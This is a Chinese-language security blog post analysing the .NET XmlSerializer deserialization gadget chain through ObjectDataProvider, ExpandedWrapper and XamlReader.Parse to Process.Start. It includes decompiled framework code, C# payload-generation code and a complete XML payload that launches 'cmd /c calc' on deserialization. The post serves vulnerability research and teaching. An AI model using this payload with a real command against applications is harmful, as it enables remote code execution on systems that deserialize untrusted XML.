---
title: >-
  '从三味书屋到百草堂，从XmlSerializer到BinnaryFormatter之XmlSerializer反序列化漏洞ObjectDataProvider利用链'
date: 2025-05-26 14:23:34
tags:
  - C#
  - 反序列化
  - XmlSerializer
  - BinnaryFormatter
  - ObjectDataProvider
categories:
  - 漏洞原理
top: 221
description: 本文详细介绍了 XmlSerializer 反序列化漏洞利用的 ObjectDataProvider 调用链路
---
# 利用链分析
我们先从`ObjectDataProvider`开始，有下面一段代码  
```c#
using System;
using System.Diagnostics;
using System.Windows.Data;
using System.IO;
using System.Xml.Serialization;

namespace Test
{
    public class Program
    {
        static void Main(string[] args)
        {
            
            ObjectDataProvider odp = new ObjectDataProvider();
			odp.ObjectInstance = new Process();
            odp.MethodParameters.Add("cmd.exe");
            odp.MethodParameters.Add("/c calc");
            odp.MethodName = "Start";
        }
    }
}
```
当这段代码运行后会弹出计算机，那么命令行代码的执行时机是在哪呢，我们观察`ObjectDataProvider`的`MethodName`以及`MethodParameters`成员变量，发现`Methodname`存在`set`访问器  
在`set`访问器中有一个if判断是否是延迟刷新，默认计算结果为`false`即会调用到`Refresh`方法  
```c#
[DefaultValue(null)]
public string MethodName
{
    get
    {
        return _methodName;
    }
    set
    {
        _methodName = value;
        OnPropertyChanged("MethodName");
        if (!base.IsRefreshDeferred)
        {
            Refresh();
        }
    }
}
```
`Refresh`方法最终会调用到`QueryWorker`方法，在`QueryWorker`方法中会调用到`InvokeMethodOnInstance`方法调用命令执行方法。  
```c#
public void Refresh()
{
    _initialLoadCalled = true;
    BeginQuery();
}
protected override void BeginQuery()
{
    if (TraceData.IsExtendedTraceEnabled(this, TraceDataLevel.Attach))
    {
        TraceData.Trace(TraceEventType.Warning, TraceData.BeginQuery(TraceData.Identify(this), IsAsynchronous ? "asynchronous" : "synchronous"));
    }

    if (IsAsynchronous)
    {
        ThreadPool.QueueUserWorkItem(QueryWorker, null);
    }
    else
    {
        QueryWorker(null);
    }
}
private void QueryWorker(object obj)
{
    object obj2 = null;
    Exception e = null;
    if (_mode == SourceMode.NoSource || _objectType == null)
    {
        if (TraceData.IsEnabled)
        {
            TraceData.Trace(TraceEventType.Error, TraceData.ObjectDataProviderHasNoSource);
        }

        e = new InvalidOperationException(SR.Get("ObjectDataProviderHasNoSource"));
    }
    else
    {
        Exception e2 = null;
        if (_needNewInstance && _mode == SourceMode.FromType)
        {
            ConstructorInfo[] constructors = _objectType.GetConstructors();
            if (constructors.Length != 0)
            {
                _objectInstance = CreateObjectInstance(out e2);
            }

            _needNewInstance = false;
        }

        if (string.IsNullOrEmpty(MethodName))
        {
            obj2 = _objectInstance;
        }
        else
        {
            obj2 = InvokeMethodOnInstance(out e);
            if (e != null && e2 != null)
            {
                e = e2;
            }
        }
    }
```
在`InvokeMethodOnInstance`将会调用指定方法
```c#
private object InvokeMethodOnInstance(out Exception e)
{
    object result = null;
    string text = null;
    e = null;
    object[] array = new object[_methodParameters.Count];
    _methodParameters.CopyTo(array, 0);
    try
    {
        result = _objectType.InvokeMember(MethodName, BindingFlags.Instance | BindingFlags.Static | BindingFlags.Public | BindingFlags.FlattenHierarchy | BindingFlags.InvokeMethod | BindingFlags.OptionalParamBinding, null, _objectInstance, array, CultureInfo.InvariantCulture);
    }
	...
}
```
也就是说`MethodName`变量的`set`访问器被触发时会调用`objectInstance`变量所指向对下个你的指定方法，方法名为`methodName`变量的值，参数为`MethodParameters`。  
`XmlSerializer`类在反序列化`xml`的时候会构造`ObjectDataProvider`对象，在对象构造的过程中会调用到其成员变量的`set`访问器为成员变量赋值从而触发命令执行。
只是这样是不够的，因为`ObjectDataProvider`对象并不能被`XmlSerializer`序列化。这个时候就需要`ExpandedWrapper`对`ObjectDataProvider`进行包装，另外即便`ObjectDataProvider`被包装后也是不能成功序列化的，  
因为`ObjectProvider`的成员变量`ObjectInstance`是一个`Process`对象，因为该对象是不能被`XmlSerializer`序列化的。  
我们可以先对命令执行的方法进行一下封装让其能够被序列化方便测试。  
代码如下：  
```c#
[XmlRoot]
public class ProcessT
{
	public void exec()
	{
		Process process = new Process();
		process.StartInfo.FileName = "cmd.exe";
		process.StartInfo.Arguments = "/c calc";
		process.Start();
	}
}
class Program
    {
        static void Main(string[] args)
        {
            ExpandedWrapper<ProcessT, ObjectDataProvider> expandedWrapper = new ExpandedWrapper<ProcessT, ObjectDataProvider>();
            ObjectDataProvider object_data_provider = new ObjectDataProvider();
            object_data_provider.MethodName = "exec";
            object_data_provider.ObjectInstance = new ProcessT();
            expandedWrapper.ProjectedProperty0 = object_data_provider;
            XmlSerializer xml = new XmlSerializer(typeof(ExpandedWrapper<ProcessT, ObjectDataProvider>));
            TextWriter text_writer = new StreamWriter(@"test.xml");
            xml.Serialize(text_writer, expandedWrapper);
            text_writer.Close();
        }
    }
``` 
这样被封装后就解决了`Process`不能被序列化的问题，那么`ExpandedWrapper`是如何解决`ObjectDataprovider`不能被序列化的问题的呢？  
在`test.xml`中序列化的数据为  
```Xml
<?xml version="1.0" encoding="utf-8"?>
<ExpandedWrapperOfProcessTObjectDataProvider xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <ProjectedProperty0>
    <ObjectInstance xsi:type="ProcessT" />
    <MethodName>exec</MethodName>
  </ProjectedProperty0>
</ExpandedWrapperOfProcessTObjectDataProvider>
```
`ExpandedWrapper`被编译的时候会自动生成一个程序集（咱也不知道是谁生成的，我看的文章是说在XmlSerializer在初始化的时候生成这个程序集），  
这个程序集中包含两个类分别是 `XmlSerializationReaderExpandedWrapper2`以及`XmlSerializationWriterExpandedWrapper2`分别在`ExpanderWrapper`的序列化以及反序列化过程中被调用  
[img1](0880c08b01109690e53a.png)
在反序列化过程中首先被调用的是`Read9_Item`方法   
[img2](0880c08b011096908d3c.png)
`Read9_Item`方法调用`Read8_Item`  
```c#
public object Read9_Item()
		{
			object result = null;
			base.Reader.MoveToContent();
			if (base.Reader.NodeType == XmlNodeType.Element)
			{
				if (base.Reader.LocalName != this.id1_Item || base.Reader.NamespaceURI != this.id2_Item)
				{
					throw base.CreateUnknownNodeException();
				}
				result = this.Read8_Item(true, true);
			}
			else
			{
				base.UnknownNode(null, ":ExpandedWrapperOfProcessTObjectDataProvider");
			}
			return result;
		}
```
`Read8_Item`最终调用到`Read7_ObjectDataProvider`，看到这个名字联想到是否会创建`ObjectDataProvider`这样是否就会给其`objectInstance`以及`MehtodName`属性赋值从而触发命令执行？  
```c#
private ExpandedWrapper<ProcessT, ObjectDataProvider> Read8_Item(bool isNullable, bool checkType)
		{
			XmlQualifiedName xmlQualifiedName = checkType ? base.GetXsiType() : null;
			bool flag = false;
			if (isNullable)
			{
				flag = base.ReadNull();
			}
			if (checkType)
			{
				if (xmlQualifiedName != null && (xmlQualifiedName.Name != this.id1_Item || xmlQualifiedName.Namespace != this.id2_Item))
				{
					throw base.CreateUnknownTypeException(xmlQualifiedName);
				}
			}
			ExpandedWrapper<ProcessT, ObjectDataProvider> result;
			if (flag)
			{
				result = null;
			}
			else
			{
				ExpandedWrapper<ProcessT, ObjectDataProvider> expandedWrapper = new ExpandedWrapper<ProcessT, ObjectDataProvider>();
				bool[] array = new bool[3];
				while (base.Reader.MoveToNextAttribute())
				{
					if (!base.IsXmlnsAttribute(base.Reader.Name))
					{
						base.UnknownNode(expandedWrapper);
					}
				}
				base.Reader.MoveToElement();
				if (base.Reader.IsEmptyElement)
				{
					base.Reader.Skip();
					result = expandedWrapper;
				}
				else
				{
					base.Reader.ReadStartElement();
					base.Reader.MoveToContent();
					int num = 0;
					int readerCount = base.ReaderCount;
					while (base.Reader.NodeType != XmlNodeType.EndElement && base.Reader.NodeType != XmlNodeType.None)
					{
						if (base.Reader.NodeType == XmlNodeType.Element)
						{
							if (!array[0] && (base.Reader.LocalName == this.id3_Description && base.Reader.NamespaceURI == this.id2_Item))
							{
								expandedWrapper.Description = base.Reader.ReadElementString();
								array[0] = true;
							}
							else if (!array[1] && (base.Reader.LocalName == this.id4_ExpandedElement && base.Reader.NamespaceURI == this.id2_Item))
							{
								expandedWrapper.ExpandedElement = this.Read2_ProcessT(false, true);
								array[1] = true;
							}
							else if (!array[2] && (base.Reader.LocalName == this.id5_ProjectedProperty0 && base.Reader.NamespaceURI == this.id2_Item))
							{
								expandedWrapper.ProjectedProperty0 = this.Read7_ObjectDataProvider(false, true);
								array[2] = true;
							}
							else
							{
								base.UnknownNode(expandedWrapper, ":Description, :ExpandedElement, :ProjectedProperty0");
							}
						}
						else
						{
							base.UnknownNode(expandedWrapper, ":Description, :ExpandedElement, :ProjectedProperty0");
						}
						base.Reader.MoveToContent();
						base.CheckReaderCount(ref num, ref readerCount);
					}
					base.ReadEndElement();
					result = expandedWrapper;
				}
			}
			return result;
		}
```
`Read7_ObjectDataProvider`在为`MethodName`赋值时将会触发 `MehtodName`的`set`访问器 从而触发命令执行  
```c#
private ObjectDataProvider Read7_ObjectDataProvider(bool isNullable, bool checkType)
		{
		...
			else
			{
				ObjectDataProvider objectDataProvider = new ObjectDataProvider();
				IList constructorParameters = objectDataProvider.ConstructorParameters;
				IList methodParameters = objectDataProvider.MethodParameters;
				bool[] array = new bool[7];
				while (base.Reader.MoveToNextAttribute())
				{
					if (!base.IsXmlnsAttribute(base.Reader.Name))
					{
						base.UnknownNode(objectDataProvider);
					}
				}
				base.Reader.MoveToElement();
				if (base.Reader.IsEmptyElement)
				{
					base.Reader.Skip();
					result = objectDataProvider;
				}
				else
				{
					base.Reader.ReadStartElement();
					base.Reader.MoveToContent();
					int num = 0;
					int readerCount = base.ReaderCount;
					while (base.Reader.NodeType != XmlNodeType.EndElement && base.Reader.NodeType != XmlNodeType.None)
					{
						if (base.Reader.NodeType == XmlNodeType.Element)
						{
							if (!array[0] && (base.Reader.LocalName == this.id7_IsInitialLoadEnabled && base.Reader.NamespaceURI == this.id2_Item))
							{
								if (base.Reader.IsEmptyElement)
								{
									base.Reader.Skip();
								}
								else
								{
									objectDataProvider.IsInitialLoadEnabled = XmlConvert.ToBoolean(base.Reader.ReadElementString());
								}
								array[0] = true;
							}
							else if (!array[1] && (base.Reader.LocalName == this.id8_ObjectType && base.Reader.NamespaceURI == this.id2_Item))
							{
								objectDataProvider.ObjectType = this.Read6_Type(false, true);
								array[1] = true;
							}
							else if (!array[2] && (base.Reader.LocalName == this.id9_ObjectInstance && base.Reader.NamespaceURI == this.id2_Item))
							{
							// 设置objectInstance属性值
								objectDataProvider.ObjectInstance = this.Read1_Object(false, true);
								array[2] = true;
							}
							else if (!array[3] && (base.Reader.LocalName == this.id10_MethodName && base.Reader.NamespaceURI == this.id2_Item))
							{
							// 设置 MethodName属性值 将会触发 MehtodName的set访问器 从而触发命令执行
								objectDataProvider.MethodName = base.Reader.ReadElementString();
								array[3] = true;
							}
				...
		}
```
到这里我们知道了通过`ExpandWrapper`包装`ObjectDataProvider`可以成功调用命令执行，但是这里有个问题就是我们的示例中调用的方法时自定义类`ProcessT`的`eval`方法，而在生产环境中是否存在这样一个可以进行命令执行的方法呢？  
可能会有，但是这里不讨论，这里我们通过另一种方式解决`Process`不能序列化的问题。  
通过前面的内容我们知道通过`ObjectDataProvider`可以调用任意类的任意方法，那么如果我们可以通过`XmlSerializer -> ObjectDataProvider -> xxx类xx方法 -> objectDataProvider -> Process`不一样可以解决问题？  
这里需要满足的条件时`xxx类xxx方法`在调用到`ObjectDataprovider`的过程中不会出现前面提到的某些类不能序列化的问题。  
这里找到的类以及方法为`XamlReader`的`parse`方法，该方法可以将`xaml`字符串反序列化为对应的数据对象。 
使用如下格式的`payload`边可以触发命令执行。  
```Xml
<ResourceDictionary 
                    xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation"" 
                    xmlns:d=""http://schemas.microsoft.com/winfx/2006/xaml"" 
                    xmlns:b=""clr-namespace:System;assembly=mscorlib"" 
                    xmlns:c=""clr-namespace:System.Diagnostics;assembly=system"">
                <ObjectDataProvider d:Key="""" ObjectType=""{d:Type c:Process}"" MethodName=""Start"">
                    <ObjectDataProvider.MethodParameters>
                        <b:String>cmd</b:String>
                        <b:String>/c calc</b:String>
                    </ObjectDataProvider.MethodParameters>
                </ObjectDataProvider>
            </ResourceDictionary>
```
可用如下代码进行测试
```c#
ExpandedWrapper<XamlReader, ObjectDataProvider> expandedWrapper = new ExpandedWrapper<XamlReader, ObjectDataProvider>();
            expandedWrapper.ProjectedProperty0 = new ObjectDataProvider();
            expandedWrapper.ProjectedProperty0.ObjectInstance = new XamlReader();
            expandedWrapper.ProjectedProperty0.MethodName = "Parse";
            expandedWrapper.ProjectedProperty0.MethodParameters.Add(@"<ResourceDictionary 
                    xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation"" 
                    xmlns:d=""http://schemas.microsoft.com/winfx/2006/xaml"" 
                    xmlns:b=""clr-namespace:System;assembly=mscorlib"" 
                    xmlns:c=""clr-namespace:System.Diagnostics;assembly=system"">
                <ObjectDataProvider d:Key="""" ObjectType=""{d:Type c:Process}"" MethodName=""Start"">
                    <ObjectDataProvider.MethodParameters>
                        <b:String>cmd</b:String>
                        <b:String>/c calc</b:String>
                    </ObjectDataProvider.MethodParameters>
                </ObjectDataProvider>
            </ResourceDictionary>
            ");
            MemoryStream memoryStream = new MemoryStream();
            TextWriter writer = new StreamWriter(memoryStream);
            XmlSerializer xml = new XmlSerializer(typeof(ExpandedWrapper<XamlReader, ObjectDataProvider>));
            xml.Serialize(writer, expandedWrapper);
            memoryStream.Position = 0;
            xml.Deserialize(memoryStream);
            Console.ReadKey();
```
那么接下来只需将`xaml`与通过`objectProvider`调用`XamlReader.Parse`方法的字符串结合起来即可  
`XmlSerializer`的`Deserialize`方法调用时先创建`ExpandWrapper`对象，在为`ExpandWrapper`的属性`ProjectedProperty0`赋值时会调用`Read7_ObjectDataProvider`方法创建`ObjectDataProvider`对象，  
`ObjectDataProvider`对象创建过程中会调用到`MethodName`的`set`访问器，然后触犯`XamlReader`的`Parse`方法对`ResourceDictionary`进行解析创建`ObjectDataProvider`这个资源，从而再次访问到`ObjectDataProvider`的`MethodName`属性的`set`访问器  
从而调用到`Process`的`Start`方法，从而导致命令执行。
```Xml
<ExpandedWrapperOfXamlReaderObjectDataProvider xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" >
           <ExpandedElement/>
    <ProjectedProperty0>
        <MethodName>Parse</MethodName>
        <MethodParameters>
            <anyType xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xsi:type="xsd:string">
                <![CDATA[
					<ResourceDictionary 
						xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" 
						xmlns:d="http://schemas.microsoft.com/winfx/2006/xaml" 
						xmlns:b="clr-namespace:System;assembly=mscorlib" 
						xmlns:c="clr-namespace:System.Diagnostics;assembly=system">
						<ObjectDataProvider d:Key="" ObjectType="{d:Type c:Process}" MethodName="Start">
							<ObjectDataProvider.MethodParameters>
								<b:String>cmd</b:String>
								<b:String>/c calc</b:String>
							</ObjectDataProvider.MethodParameters>
						</ObjectDataProvider>
					</ResourceDictionary>
					]]>
            </anyType>
        </MethodParameters>
        <ObjectInstance xsi:type="XamlReader"></ObjectInstance>
    </ProjectedProperty0>
</ExpandedWrapperOfXamlReaderObjectDataProvider>
```


